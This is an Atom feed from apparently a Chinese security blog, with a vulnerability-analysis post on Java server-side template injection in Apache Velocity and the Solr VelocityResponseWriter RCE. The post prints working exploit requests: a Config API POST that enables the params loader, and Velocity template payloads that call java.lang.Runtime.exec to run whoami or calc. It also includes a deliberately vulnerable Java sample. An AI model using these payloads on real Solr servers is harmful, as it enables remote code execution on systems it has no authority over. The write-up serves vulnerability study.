<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>像清水一般清澈透明</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-03-24T07:39:13.367Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Samny</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>白头搔更短，SSTI惹人心！</title>
    <link href="http://yoursite.com/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/"/>
    <id>http://yoursite.com/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/</id>
    <published>2020-03-24T07:20:16.000Z</published>
    <updated>2020-03-24T07:39:13.367Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>为什么说Java审计南在SSTI呢？</strong></p><ol><li>现行SSTI(Server-Side Template Injection ) 资料不少，但与Java，以著名的先知社区为例（如下图所示），关于SSTI文章也不过几篇而已，但与Java相关的一篇都没有。<br><img src="https://img-blog.csdnimg.cn/2020031517280148.png" alt="在这里插入图片描述"></li><li>搜索CVE漏洞有关于SSTI的漏洞编号也不过只有几个而已。<br><img src="https://img-blog.csdnimg.cn/20200317133833592.png" alt="在这里插入图片描述"></li><li>如果你是一名老司机，已经挖过ssti漏洞，那你是否知道payload构造原理呢？本文为你解惑！老司机可以直接跳转到后记看本文，或者你只是想看payload构造原理亦如此，本文篇幅较长，建议先收藏。</li></ol><hr><h1 id="SSTI-服务端模板注入"><a href="#SSTI-服务端模板注入" class="headerlink" title="SSTI 服务端模板注入"></a>SSTI 服务端模板注入</h1><p>&emsp;&emsp; ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p><p><img src="https://img-blog.csdnimg.cn/202003161429497.gif" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞源码</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">velocity</span><span class="params">(String template)</span></span>&#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">"author"</span>, <span class="string">"Elliot A."</span>);</span><br><span class="line">        context.put(<span class="string">"address"</span>, <span class="string">"217 E Broadway"</span>);</span><br><span class="line">        context.put(<span class="string">"phone"</span>, <span class="string">"555-1337"</span>);</span><br><span class="line"></span><br><span class="line">        StringWriter swOut = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        <span class="comment">// 使用Velocity</span></span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">"test"</span>, template);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>POC</strong><br><code>http://localhost:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</code></p><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Velocity.evaluate函数源码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>设置断点开始调试</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316151247751.png" alt="在这里插入图片描述"></p><ul><li>进入Velocity.evaluate方法查看方法详情</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200316151614641.png" alt="在这里插入图片描述"></p><ul><li>继续跟进查看，这个就是Java最常见的get方法(初始化)。也是Java的特性之一封装性。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316152752486.png" alt="在这里插入图片描述"></p><ul><li>RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316153220725.png" alt="在这里插入图片描述"></p><ul><li>进入StringReader看看</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316154323392.png" alt="在这里插入图片描述"></p><ul><li>在进入evaluate查看方法具体实现过程</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer writer, String logTag, Reader reader)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (logTag == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">"logTag (i.e. template name) cannot be null, you must provide an identifier for the content being evaluated"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">            SimpleNode nodeTree = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 来到这里进行解析</span></span><br><span class="line">                nodeTree = <span class="keyword">this</span>.parse(reader, logTag);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var7, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (TemplateInitException var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var8, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">// 判断，然后进入this.render方法</span></span><br><span class="line">            <span class="keyword">return</span> nodeTree == <span class="keyword">null</span> ? <span class="keyword">false</span> : <span class="keyword">this</span>.render(context, writer, logTag, nodeTree);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>继续跟进render方法</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161419209.png" alt="在这里插入图片描述"></p><ul><li>render方法里面还有一个render方法，真的是™烦。不过这个是simpleNodel类的render方法。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161613552.png" alt="在这里插入图片描述"></p><ul><li><strong>高潮激情部分</strong>，由于前面两个没有什么用，让我们直接跳到第三个看，进入render方法。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162015493.png" alt="在这里插入图片描述"></p><ul><li>在这里我们不能发现有一个execute方法，这就是罪魁祸首。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162552984.png" alt="在这里插入图片描述"></p><ul><li>让我们进行跟进方法，由于是重构的execute方法，还是得看清楚点原理。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 截取的部分关键性源代码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numChildren; ++i) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.strictRef &amp;&amp; result == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            methodName = <span class="keyword">this</span>.jjtGetChild(i).getFirstToken().image;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> VelocityException(<span class="string">"Attempted to access '"</span> + methodName + <span class="string">"' on a null value at "</span> + Log.formatFileString(<span class="keyword">this</span>.uberInfo.getTemplateName(), <span class="keyword">this</span>.jjtGetChild(i).getLine(), <span class="keyword">this</span>.jjtGetChild(i).getColumn()));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        previousResult = result;</span><br><span class="line">                        result = <span class="keyword">this</span>.jjtGetChild(i).execute(result, context);</span><br><span class="line">                        <span class="keyword">if</span> (result == <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.strictRef) &#123;</span><br><span class="line">                            failedChild = i;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>上面的for循环我就不说了它的作用了，我们焦点放在previousResult （之前的结果）和result上面。</p></li><li><p>previousResult = result;首先这行代码使其它们保持一致</p></li><li><p>当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE<br><img src="https://img-blog.csdnimg.cn/20200316155414726.png" alt="在这里插入图片描述"></p></li><li><p>完整的效果展示<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xMTE0NTgwMS1mYjEyMzA5YjRjMDU5MmE2LmdpZg" alt></p></li><li><p>完整的调用链</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162402512.png" alt="在这里插入图片描述"></p><hr><h1 id="案例分析-—-Apache-solr-Velocity-模版注入"><a href="#案例分析-—-Apache-solr-Velocity-模版注入" class="headerlink" title="案例分析 — Apache solr Velocity 模版注入"></a>案例分析 — Apache solr Velocity 模版注入</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp; 这个漏洞是去年10月底爆出的漏洞，这里只做必要的简单复现，笔者在这篇文章里主要是分析，更加完整的<a href="https://blog.csdn.net/sun1318578251/article/details/102843715" target="_blank" rel="noopener">漏洞复现过程</a>参考。</p><ol><li>第一步修改配置，开启Velocity模版里<code>VelocityResponseWriter</code>初始化参数的<code>params.resource.loader.enabled</code>选项，该选项默认是<code>false</code>。查看<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">W3Cschool solr官方文档</a>可知，solr是配置api可以进行查看配置、修改配置的。</li></ol><p>访问查看<code>http://127.0.0.1:8983/solr/test/config</code>配置信息<br><img src="https://img-blog.csdnimg.cn/20200321162727737.png" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317150202155.png" alt="在这里插入图片描述"></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317151703268.png" alt="在这里插入图片描述"></p><hr><h2 id="漏洞分析环境搭建"><a href="#漏洞分析环境搭建" class="headerlink" title="漏洞分析环境搭建"></a>漏洞分析环境搭建</h2><p>&emsp;&emsp; 笔者在此是使用远程代码调试的方式，分析源码。<a href="https://archive.apache.org/dist/lucene/solr/8.2.0/" target="_blank" rel="noopener">源码下载地址</a>windows用户可以选择下载这两个，这里笔者下载下载第二个。（下载第一个需要编译，过程自行百度）<br><img src="https://img-blog.csdnimg.cn/20200317160246408.png" alt="在这里插入图片描述"></p><ol><li><p>解压，将源码导入idea中，并配置idea中远程代码调试。<br><img src="https://img-blog.csdnimg.cn/20200317160450347.png" alt="在这里插入图片描述"></p></li><li><p>在第二个下载压缩包路径CMD环境下（~~\solr-8.2.0\bin\），启动命令<code>solr start -p 8983 -f -a &quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8983&quot;</code><br><img src="https://img-blog.csdnimg.cn/20200317161340408.png" alt="在这里插入图片描述"></p></li><li><p>用idea打开项目，导入jar文件设置为library。（还有几处在solr-8.2.0\contrib\velocity\lib、solr-8.2.0\server\lib……）<br><img src="https://img-blog.csdnimg.cn/20200323143907966.png" alt="在这里插入图片描述"></p></li><li><p>打断点调试代码。分析一个web项目首先我们得看web.xml文件<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\web.xml</code>，看第一句，发现<code>在solrconfig.xml中注册的任何路径（名称）都将发送到该过滤器</code>。<br><img src="https://img-blog.csdnimg.cn/20200321153010735.png" alt="在这里插入图片描述"></p></li></ol><ul><li>断点位置，为什么会在这里打个断点，笔者翻阅资料得知这里是核心位置。具体参考<a href="https://my.oschina.net/haitaohu/blog/3078667" target="_blank" rel="noopener">solr源码阅读</a>。<br><img src="https://img-blog.csdnimg.cn/20200321154555773.png" alt="在这里插入图片描述"></li></ul><hr><h2 id="漏洞成因分析-–-代码层"><a href="#漏洞成因分析-–-代码层" class="headerlink" title="漏洞成因分析 – 代码层"></a>漏洞成因分析 – 代码层</h2><h3 id="POC第一部分"><a href="#POC第一部分" class="headerlink" title="POC第一部分"></a>POC第一部分</h3><p>&emsp;&emsp; 第一部分分析请查看<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">Solr配置API：Config API</a>文档，文档中说明的很清楚。PS：漏洞复现的时候也有说明。<br><img src="https://img-blog.csdnimg.cn/2020032319153017.png?" alt="在这里插入图片描述"></p><hr><h3 id="POC后部分分析"><a href="#POC后部分分析" class="headerlink" title="POC后部分分析"></a>POC后部分分析</h3><ol><li>笔者这里直接说几个关键的部分代码<br>第一步先处理请求<br><img src="https://img-blog.csdnimg.cn/20200324135210989.png" alt="在这里插入图片描述"><ol start="2"><li><code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\SolrDispatchFilter.class</code>跳转到<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\HttpSolrCall.class</code> 先处理参数wt，设置为velocity。<br><img src="https://img-blog.csdnimg.cn/20200324140636319.png" alt="在这里插入图片描述"></li><li>写入响应<br><img src="https://img-blog.csdnimg.cn/202003241354181.png" alt="在这里插入图片描述"></li><li>判断方法，写查询响应，进一步查看内容。solrReuest就是我们的payload。<br><img src="https://img-blog.csdnimg.cn/2020032414122987.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324141356198.png" alt="在这里插入图片描述"></li><li>跳转到velocityResponWriter.class,会创建velocity模板引擎。在到133行的位置进入模板方法<br><img src="https://img-blog.csdnimg.cn/20200324141530325.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324141916156.png" alt="在这里插入图片描述"></li><li>在这里会跳转到SimpleNode.class类（我们熟悉的类），第一步会设置指引，接着会到ASTReference.class 在第八的位置，会遍历方法，会执行命令。<br><img src="https://img-blog.csdnimg.cn/20200324142424569.png" alt="在这里插入图片描述"></li><li>在这里会跳转到ASTMethod类中，执行。<br><img src="https://img-blog.csdnimg.cn/20200324143631629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200324143501469.png" alt="在这里插入图片描述"></li><li>具体执行是velocity模板引擎中有一个ClassMap类中。<br><img src="https://img-blog.csdnimg.cn/20200323201336890.png" alt="在这里插入图片描述"></li></ol></li></ol><hr><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a><strong>知识补充</strong></h2><p>&emsp;&emsp; 在前面有涉及到JJTree、payload构造、JavaCC等知识，但笔者并没有详细的说明，笔者想先读者们简单了解一下这些知识，然后在说明一下简单做个简单说明。</p><h2 id="set语法"><a href="#set语法" class="headerlink" title="#set语法"></a><strong>#set语法</strong></h2><p>&emsp;&emsp; #set语法可以创建一个Velocity的变量，#set语法对应的Velocity语法树是ASTSetDirective类，翻开这个类的代码，可以发现它有两个子节点：分别是RightHandSide和LeftHandSide，分别代表“=”两边的表达式值。与Java语言的赋值操作有点不一样的是，左边的LeftHandSide可能是一个变量标识符，也可能是一个set方法调用。变量标识符很好理解，如前面的#set($var=“偶数”)，另外是一个set方法调用，如#set($person.name=”junshan”)，这实际上相当于Java中person.setName(“junshan”)方法的调用。</p><h2 id="foreach语法"><a href="#foreach语法" class="headerlink" title="#foreach语法"></a><strong>#foreach语法</strong></h2><p>Velocity中的循环语法只有这一种，它与Java中的for循环的语法糖形式十分类似，如#foreach($child in $person.children) $person.children表示的是一个集合，它可能是一个List集合或者一个数组，而$child表示的是每个从集合中取出的值。从render方法代码中可以看出，Velocity首先是取得$person.children的值，然后将这个值封装成Iterator集合，然后依次取出这个集合中的每一个值，将这个值以$child为变量标识符放入context中。除此以外需要特别注意的是，Velocity在循环时还在context中放入了另外两个变量，分别是counterName和hasNextName，这两个变量的名称分别在配置文件配置项directive.foreach.counter.name和directive.foreach.iterator.name中定义，它们表示当前的循环计数和是否还有下一个值。前者相当于for(int i=1;i&lt;10;i++)中的i值，后者相当于while(it.hasNext())中的it.hasNext()的值，这两个值在#foreach的循环体中都有可能用到。由于elementKey、counterName和hasNextName是在#foreach中临时创建的，如果当前的context中已经存在这几个变量，要把原始的变量值保存起来，以便在这个#foreach执行结束后恢复。如果context中没有这几个变量，那么#foreach执行结束后要删除它们，这就是代码最后部分做的事情，这与我们前面介绍的#set语法没有范围限制不同，#foreach中临时产生的变量只在#foreach中有效。</p><h2 id="JJTree渲染过程解析"><a href="#JJTree渲染过程解析" class="headerlink" title="JJTree渲染过程解析"></a><strong>JJTree渲染过程解析</strong></h2><p>下面是JJTree的语法树：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvOTkwNTMyLzIwMTYxMC85OTA1MzItMjAxNjEwMjUxNTI3NDM3NTAtMTA4MzgwODIyOC5wbmc?x-oss-process=image/format,png" alt></p><h2 id="关于POC构造方法补充说明"><a href="#关于POC构造方法补充说明" class="headerlink" title="关于POC构造方法补充说明"></a><strong>关于POC构造方法补充说明</strong></h2><p><strong>VelocityResponseWriter 初始化参数</strong></p><ul><li>template.base.dir<br>如果指定并作为文件系统目录存在，则将为此目录添加一个文件资源加载程序。此目录中的模板将覆盖 “solr” 资源加载程序模板。 </li><li>init.properties.file<br>指定一个属性文件名，必须存在于 Solr 的conf/目录（而不是在velocity/子目录中）或者 <lib> 的 JAR 文件的根中。 </lib></li><li>params.resource.loader.enabled<br>“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：</li></ul><p><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_namev.template=custom</code>表示要呈现一个名为“自定义”的模板，其值<code>v.template.custom</code>是自定义模板。默认情况下为<code>false</code>；它不常用，需要时启用。</p><ul><li>solr.resource.loader.enabled<br>“solr” 资源加载程序是默认注册的唯一模板加载程序。模板是由 SolrResourceLoader 从velocity/子目录下可见的资源提供的。VelocityResponseWriter 本身有一些内置的模板（在它 JAR 文件中的velocity/），这些模板可以通过这个加载程序自动使用。当相同的模板名称处于 conf/velocity/ 或使用template.base.dir选项时，可以覆盖这些内置模板。 </li></ul><hr><p><strong>VelocityResponseWriter请求参数</strong></p><ul><li><p>v.template<br>指定要呈现的模板的名称。</p></li><li><p>v.layout<br>指定一个模板名称，用作围绕主<code>v.template</code>指定模板的布局。<br>主模板呈现为包含在布局渲染中的字符串值$content。</p></li><li><p>v.layout.enabled<br>确定主模板是否应该有围绕它的布局。默认是<code>true</code>，但也需要指定<code>v.layout</code>。<br>v.contentType<br>指定 HTTP 响应中使用的内容类型。如果没有指定，默认取决于是否指定<code>v.json</code>。<br>默认情况下不包含<code>v.json=wrf：text/html;charset=UTF-8</code>。<br>默认为<code>v.json=wrf：application/json;charset=UTF-8</code>。</p></li><li><p>v.json<br>指定一个函数名称来包装呈现为 JSON 的响应。如果指定，则响应中使用的内容类型将为“application / json; charset = UTF-8”，除非被<code>v.contentType</code>覆盖。<br>输出将采用以下格式（带<code>v.json=wrf</code>）：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrf(&quot;result&quot;:&quot;&lt;Velocity generated response string, with quotes and backslashes escaped&gt;&quot;)</span><br></pre></td></tr></table></figure></li><li><p>v.locale<br>使用<code>$resource</code>工具和其他 LocaleConfig 实现工具的语言环境。默认语言环境是<code>Locale.ROOT</code>。本地化资源从名为<code>resources[_locale-code].properties</code>的标准 Java 资源包中加载<br>可以通过提供由 SolrResourceLoader 在速度子下的资源包可见的 JAR 文件来添加资源包。资源包不能在<code>conf/</code>下加载，因为只有 SolrResourceLoader 的类加载程序方面可以在这里使用。</p></li><li><p>v.template.template_name<br>当启用 “params” 资源加载程序时，可以将模板指定为 Solr 请求的一部分。<br><code>params.resource.loader.enabled</code><br>“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：<br><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_name</code></p></li></ul><hr><ol><li>先将poc进行解码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8983&#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;#set($x&#x3D;&#39;&#39;) #set($rt&#x3D;$x.class.forName(&#39;java.lang.Runtime&#39;)) #set($chr&#x3D;$x.class.forName(&#39;java.lang.Character&#39;)) #set($str&#x3D;$x.class.forName(&#39;java.lang.String&#39;)) #set($ex&#x3D;$rt.getRuntime().exec(&#39;calc&#39;)) $ex.waitFor() #set($out&#x3D;$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure></li><li>set和foreach语法前面都介绍了，现在在看payload是不是就一目了然了？如何构造，为什么这么构造..<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x='')  </span><br><span class="line">#set($rt=$x.class.forName('java.lang.Runtime'))</span><br><span class="line">#set($chr=$x.class.forName('java.lang.Character'))  </span><br><span class="line">#set($str=$x.class.forName('java.lang.String'))</span><br><span class="line">#set($ex=$rt.getRuntime().exec('calc'))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/2020031621445369.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200316214532444.png" alt="在这里插入图片描述"></li></ol><hr><p><strong>附图：各框架模板结构：</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wNS5zc2wucWhpbWcuY29tL3QwMWY0NzkyYzdkMDNkZDQ5Y2MucG5n?x-oss-process=image/format,png" alt></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p>&emsp;&emsp; Apache Solr的<code>Config API</code>是自带功能，用于通过HTTP请求更改配置；当Solr未设置访问鉴权时，可以直接通过ConfigAPI更改配置，为漏洞利用创造了前提。config api是solr多此爆出漏洞关键<a href="https://github.com/Imanfeng/Apache-Solr-RCE" target="_blank" rel="noopener">Apache Solr RCE</a>有想法的童鞋可以看看这个项目。</p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>&emsp;&emsp; 之前刚刚爆出漏洞的时候，笔者还曾复现过，但奈何能力有限，不能深入理解其中内涵。深表惭愧，总的来说，努力学习，安全一行任重而道远。</p><hr><h1 id="推荐学习资料"><a href="#推荐学习资料" class="headerlink" title="推荐学习资料"></a>推荐学习资料</h1><p>&emsp;&emsp; 想进行深入研究此漏洞肯定光看我这篇文章是不足的，毕竟我这这个只是Java方面上的，python、php等语言都没介绍。故此推荐，望彼有助。</p><p><strong>国内资料</strong></p><p>Python方面：<a href="https://www.anquanke.com/post/id/188172" target="_blank" rel="noopener">SSTI/沙盒逃逸详细总结</a><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a><br>PHP方面：<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）之浅析</a></p><p><strong>国外资料</strong></p><p>这篇总结的比较全面：<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">Server-Side Template Injection: RCE for the modern webapp</a><br>Python方面：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">Jinja2 template injection filter bypasses</a></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.liangzl.com/get-article-detail-138970.html" 